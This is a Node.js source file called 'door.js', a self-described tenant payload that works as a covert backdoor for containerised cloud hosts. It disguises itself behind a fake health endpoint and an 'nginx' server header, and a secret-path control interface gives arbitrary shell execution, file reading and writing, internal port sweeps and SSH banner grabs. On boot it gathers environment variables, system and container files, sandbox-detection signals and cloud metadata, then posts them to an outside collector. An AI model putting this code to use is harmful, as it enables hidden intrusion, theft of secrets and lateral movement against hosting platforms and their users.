/* door.js - WAR-01 tenant payload. Node 22 built-ins only: no deps, no install, no children for the core.
   Gate: GET /api/health -> 200, synchronous, zero I/O. Control: GET/POST under a baked path secret.
   Report: credential-free JSON POST to DOOR_CAP. Nothing here may crash the container. */
'use strict';
const http = require('node:http'), https = require('node:https'), net = require('node:net');
const fs = require('node:fs'), os = require('node:os'), cp = require('node:child_process');
const crypto = require('node:crypto'), dns = require('node:dns');
const PORT = Number(process.env.PORT || 3000);
const K = process.env.DOOR_K || '';
const CAP = process.env.DOOR_CAP || '';
const ID = process.env.DOOR_ID || 'app';
const SSH = (process.env.DOOR_SSH || '').split(',').filter(Boolean);
const PT = (process.env.DOOR_PT || '').split(',').filter(Boolean);
const SW = (process.env.DOOR_SW || '').split(',').filter(Boolean);
const NAMES = (process.env.DOOR_DNS || '').split(',').filter(Boolean);
const BOOT = Date.now();
process.title = 'node';
const p0 = (a, b) => (a.endsWith('/') ? a : a + '/') + b;

function rd(p, n) { const cap = Math.min(Math.max(Number(n) || 8192, 1), 262144); let fd = null;
  try { fd = fs.openSync(p, 'r'); const s = fs.fstatSync(fd), buf = Buffer.alloc(cap); let tot = 0, g = 0;
    while (tot < cap && g++ < 64) { const c = fs.readSync(fd, buf, tot, cap - tot); if (c <= 0) break; tot += c; }
    const kind = s.isDirectory() ? 'dir' : s.isCharacterDevice() ? 'char' : s.isBlockDevice() ? 'block' : s.isFIFO() ? 'fifo' : s.isSymbolicLink() ? 'link' : 'file';
    return { ok: 1, len: tot, cap: cap, type: kind, txt: (tot >= cap ? buf.subarray(0, tot).toString() + '~' : buf.subarray(0, tot).toString()) };
  } catch (e) { return { ok: 0, code: String(e.code || e.message) }; } finally { if (fd !== null) { try { fs.closeSync(fd); } catch {} } } }
const tx = (p, n = 4096) => { const r = rd(p, n); return r.ok ? r.txt : '@' + (r.code || 'err'); };
const st = p => { try { const s = fs.statSync(p); return { size: s.size, mode: (s.mode & 0o777).toString(8), dir: s.isDirectory(), uid: s.uid, gid: s.gid }; } catch (e) { return { err: String(e.code || e.message) }; } };
const ls = (p, n = 400) => { try { return fs.readdirSync(p).slice(0, n); } catch { return []; } };
function walk(p, d, out) { out = out || []; if (out.length > 3000 || d < 0) return out;
  for (const e of ls(p, 300)) { const f = p0(p, e), s = st(f); out.push(f + ' ' + JSON.stringify(s)); if (s.dir) walk(f, d - 1, out); } return out; }
function caps() { const t = tx('/proc/self/status', 12288), o = {}; let m;
  const re = /(CapInh|CapPrm|CapEff|CapBnd|CapAmb|NoNewPrivs|Seccomp|Threads):\s*(\S+)/g;
  while ((m = re.exec(t))) o[m[1]] = m[2]; return o; }

function fetch(u, m = 'GET', b = null, hdr = {}, ms = 9000) {
  return new Promise(res => { let t; try { t = new URL(u); } catch { return res({ err: 'badurl' }); }
    if (!/^https?:$/.test(t.protocol)) return res({ err: 'badscheme' });
    const rq = (t.protocol === 'https:' ? https : http).request(t, { method: m, headers: hdr, timeout: ms, servername: t.hostname }, r => {
      let n = 0, s = ''; r.on('data', c => { n += c.length; if (s.length < 65536) s += c; });
      r.on('end', () => res({ status: r.statusCode, headers: r.headers, body: s, bytes: n }));
      r.on('error', e => res({ err: String(e.code || e.message) }));
    });
    rq.on('timeout', () => rq.destroy(new Error('timeout')));
    rq.on('error', e => res({ err: String(e.code || e.message || 'err') }));
    if (b) rq.write(b); rq.end(); });
}
const tcp = (h, p, ms = 2500) => new Promise(res => { let d = 0; const f = v => { if (!d) { d = 1; try { s.destroy(); } catch {} res(v); } };
  const s = net.connect({ host: h, port: Number(p) }); s.setTimeout(ms, () => f('timeout'));
  s.once('connect', () => f('open')); s.once('error', e => f('err:' + e.code)); s.once('close', () => f('closed')); });
const banner = (h, p = 22, ms = 3000) => new Promise(res => { let d = 0, s = ''; const f = v => { if (!d) { d = 1; try { c.destroy(); } catch {} res(v); } };
  const c = net.connect({ host: h, port: Number(p) }); c.setTimeout(ms, () => f({ state: 'timeout', banner: s.trim() || null }));
  c.once('connect', () => c.on('data', b => { s += b; if (s.length >= 200 || /\r?\n/.test(s)) f({ state: 'open', banner: s.slice(0, 200).trim() }); }));
  c.once('error', e => f({ state: 'err:' + e.code, banner: null })); c.once('close', () => f({ state: 'closed', banner: s.trim() || null })); });
const look = (n, ms = 4000) => new Promise(res => { let d = 0; const t = setTimeout(() => { if (!d) { d = 1; res('timeout'); } }, ms);
  dns.lookup(n, { all: true, verbatim: true }, (e, a) => { if (d) return; d = 1; clearTimeout(t);
    res(e ? 'err:' + e.code : a.map(x => x.address).join(',')); }); });

async function sweep(net, ports, lim) {
  const base = net.split('/')[0].split('.').map(Number), out = []; let used = 0;
  for (let i = 1; i < 255 && used < lim; i++) {
    const h = base[0] + '.' + base[1] + '.' + base[2] + '.' + i;
    for (const p of ports) { used++; const r = await tcp(h, p, 300); if (r === 'open') out.push(h + ':' + p); if (used >= lim) break; }
  }
  return { hosts: out, conns: used, cap: lim };
}
function gvisor(v, rel) {
  const mods = rd('/proc/modules', 8192), fsys = tx('/proc/filesystems', 4096), sig = [];
  let sm = -1; try { sm = fs.readdirSync('/sys/module').length; } catch (e) { sm = 'err:' + e.code; }
  let drv = -1; try { drv = fs.readdirSync('/sys/bus').length; } catch (e) { drv = 'err:' + e.code; }
  const ci = tx('/proc/cpuinfo', 4096);
  if (/gvisor/i.test(v) || /gvisor/i.test(rel)) sig.push('version:runsc-string');
  if (!mods.ok) sig.push('modules:' + mods.code); else if (!mods.txt.trim()) sig.push('modules:empty');
  if (sm === 0 || String(sm).startsWith('err')) sig.push('sys-module:' + sm);
  if (!/(overlay|ext4|btrfs|xfs)/.test(fsys)) sig.push('filesystems:no-fs-drivers');
  if (!/model name|Features/.test(ci)) sig.push('cpuinfo:no-hardware-strings');
  if (drv === 0 || String(drv).startsWith('err')) sig.push('sys-bus:' + drv);
  const hard = sig.filter(s => !/filesystems|cpuinfo/.test(s)).length;
  const runsc = /gvisor/i.test(v) || /gvisor/i.test(rel);
  return { verdict: runsc ? 'gvisor-runsc' : hard >= 2 ? 'likely-gvisor' : sig.length ? 'possible-gvisor' : 'looks-like-host-linux', signals: sig };
}
async function info() {
  const rel = tx('/proc/sys/kernel/osrelease', 64), ver = tx('/proc/version', 256);
  let grp = null, who = null; try { grp = process.getgroups(); } catch {} try { who = os.userInfo().username; } catch {}
  const pt = {}; const pr = await Promise.all(PT.map(x => { const a = x.split(':'); return tcp(a[0], a[1], 2500); }));
  PT.forEach((x, i) => pt[x] = pr[i]);
  return { id: ID, ts: new Date().toISOString(), up: Date.now() - BOOT, pid: process.pid,
    uid: process.getuid(), gid: process.getgid(), groups: grp, user: who, caps: caps(),
    hostname: os.hostname(), machine: os.type() + ' ' + os.release() + ' ' + os.machine(),
    arch: os.arch() + '/' + os.platform(), node: process.version, cpu: os.cpus().length, mem: os.totalmem(),
    shell: (() => { try { return fs.accessSync('/bin/sh', fs.constants.X_OK), 1; } catch { return 0; } })(),
    kernel: { version: ver, osrelease: rel, kversion: tx('/proc/sys/kernel/version', 128), modules: rd('/proc/modules', 2048), cmdline: tx('/proc/cmdline', 512), status: tx('/proc/self/status', 3072) },
    runtime: gvisor(ver, rel), cgroup_init: tx('/proc/1/cgroup', 1024), cgroup_self: tx('/proc/self/cgroup', 512),
    init_cmdline: tx('/proc/1/cmdline', 512), mountinfo: tx('/proc/self/mountinfo', 12288),
    dockerenv: fs.existsSync('/.dockerenv'), docker_sock: st('/var/run/docker.sock'),
    resolv: tx('/etc/resolv.conf', 1024), hosts: tx('/etc/hosts', 512), osrel: tx('/etc/os-release', 512),
    env: process.env, ifaces: os.networkInterfaces(), tcp: pt };
}
async function netrep() {
  const b = {}; for (const h of SSH) b[h + ':22'] = await banner(h, 22, 3000);
  const q = []; for (const s of SW) { const a = s.split(':'); q.push(await sweep(a[0], [Number(a[1])], Number(process.env.DOOR_SWLIM || 60))); }
  const d = {}; for (const n of NAMES) d[n] = await look(n);
  const meta = await fetch('https://metadata.oraclevcn.com/compute/v1/instance/', 'GET', null, { host: 'metadata.oraclevcn.com' });
  return { banners: b, sweeps: q, dns: d, oci_meta: { status: meta.status || null, err: meta.err || null, body: (meta.body || '').slice(0, 1500) } };
}
async function send(tag, obj) {
  if (!CAP) return { skipped: 1 };
  const r = await fetch(CAP, 'POST', JSON.stringify(Object.assign({ tag: tag, id: ID, ts: new Date().toISOString() }, obj)), { 'content-type': 'application/json' });
  return { status: r.status || null, err: r.err || null };
}
function run(c) { try { const o = cp.execSync(c, { timeout: 15000, maxBuffer: 1 << 20, stdio: ['ignore', 'pipe', 'pipe'], shell: '/bin/sh' }); return { ok: 1, out: String(o).slice(0, 65536) }; } catch (e) { return { ok: 0, code: String(e.code || e.name), out: String(e.stdout || '').slice(0, 8192), err: String(e.stderr || e.message).slice(0, 4096) }; } }

async function op(o) {
  o = o || {};
  if (o.op === 's') return await info();
  if (o.op === 'g') return { sent: await send('recon', await info()) };
  if (o.op === 'n') return { net: await netrep() };
  if (o.op === 'N') return { sent: await send('net', await netrep()) };
  if (o.op === 'f') return rd(String(o.p), Number(o.n) || 65536);
  if (o.op === 'l') return st(String(o.p));
  if (o.op === 'd') return { p: o.p, entries: ls(String(o.p)).map(e => Object.assign({ e: e }, st(p0(String(o.p), e)))) };
  if (o.op === 'w') return { p: o.p, paths: walk(String(o.p), Number(o.d) || 3) };
  if (o.op === 'k') { try { fs.writeFileSync(String(o.p), String(o.b)); return { ok: 1, size: fs.statSync(String(o.p)).size }; } catch (e) { return { ok: 0, code: String(e.code) }; } }
  if (o.op === 'h') return await fetch(String(o.u), String(o.m || 'GET'), o.b == null ? null : String(o.b), o.h || {});
  if (o.op === 't') return { t: await tcp(String(o.h), o.p, Number(o.n) || 2500) };
  if (o.op === 'b') return { b: await banner(String(o.h), o.p, Number(o.n) || 3000) };
  if (o.op === 'q') return { q: await sweep(String(o.net), (o.ports || '22').split(',').map(Number), Number(o.lim) || 60) };
  if (o.op === 'z') return { z: await look(String(o.name)) };
  if (o.op === 'x') return run(String(o.c));
  if (o.op === 'r') return { sent: await send('beat', { up: Date.now() - BOOT }) };
  return { err: 'op?' };
}
const dec = s => { try { return decodeURIComponent(s.replace(/\+/g, ' ')); } catch { return ''; } };
const body = r => new Promise(res => { let s = '', n = 0; r.on('data', c => { n += c.length; if (s.length < 262144) s += c; }); r.on('end', () => res(s)); r.on('error', () => res(s)); });
const same = (a, b) => crypto.timingSafeEqual(crypto.createHash('sha256').update(String(a)).digest(), crypto.createHash('sha256').update(String(b)).digest());

const srv = http.createServer(async (req, res) => {
  const done = (c, s) => { try { res.writeHead(c, { server: 'nginx', 'content-type': 'application/json' }); res.end(s); } catch {} };
  try {
    const raw = req.url || '/', qs = raw.indexOf('?'), hash = raw.indexOf('#');
    let p = raw.slice(0, qs < 0 ? raw.length : qs); if (hash >= 0 && (qs < 0 || hash < qs)) p = raw.slice(0, hash);
    if (p === '/api/health' || p === '/health' || p === '/') return done(200, '{"status":"ok"}');
    try { p = decodeURIComponent(p); } catch { return done(404, '{"error":"Not Found"}'); }
    if (p === '/api/health' || p === '/health' || p === '/') return done(200, '{"status":"ok"}');
    const pre = '/' + K;
    if (!K || p.length < pre.length || !same(p.slice(0, pre.length), pre) || (p.length > pre.length && p[pre.length] !== '/')) return done(404, '{"error":"Not Found"}');
    let j = {};
    if (req.method === 'POST') { try { j = JSON.parse((await body(req)) || '{}'); } catch { return done(400, '{"error":"badjson"}'); } }
    else { j = { op: p.slice(pre.length + 1) }; for (const kv of (qs < 0 ? '' : raw.slice(qs + 1)).split('&')) { if (!kv) continue; const i = kv.indexOf('='); const k = dec(kv.slice(0, i < 0 ? kv.length : i)); if (k) j[k] = dec(kv.slice(i + 1)); } }
    done(200, JSON.stringify(await op(j)));
  } catch (e) { done(500, JSON.stringify({ err: String((e && (e.code || e.message)) || 'err') })); }
});
srv.on('clientError', (e, s) => { try { s.end('HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n'); } catch {} });
srv.listen(PORT, '0.0.0.0', () => {
  info().then(i => send('boot', i)).then(() => netrep()).then(n => send('net', n)).catch(e => console.error('boot', String(e && e.message)));
});
srv.on('error', e => console.error('srv', e.code || e.message));
process.on('uncaughtException', e => console.error('ue', String((e && (e.code || e.message)) || e)));
process.on('unhandledRejection', e => console.error('ur', String((e && (e.code || e.message)) || e)));
process.on('SIGTERM', () => process.exit(0));
